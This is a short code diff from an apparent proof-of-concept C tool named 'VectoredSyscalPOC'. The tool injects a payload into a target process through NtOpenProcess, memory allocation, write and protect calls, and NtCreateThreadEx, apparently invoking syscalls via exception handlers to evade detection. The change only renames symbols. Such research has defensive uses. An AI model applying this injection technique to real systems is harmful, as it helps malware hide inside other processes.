@@ -116,9 +116,9 @@ void VectoredSyscalPOC(unsigned char payload[], SIZE_T payload_size, int pid) {
 	// exception handler via RIP register 
 
 	_NtOpenProcess pNtOpenProcess = (_NtOpenProcess)SysNtOpenProcess;
-	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)SysNtAllocateVirtualMemory;
-	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)SysNtWriteVirtualMemory;
-	_NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)SysNtProtectVirtualMemory;
+	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)SysNtAllocateVirtualMem;
+	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)SysNtWriteVirtualMem;
+	_NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)SysNtProtectVirtualMem;
 	_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)SysNtCreateThreadEx;
 
 
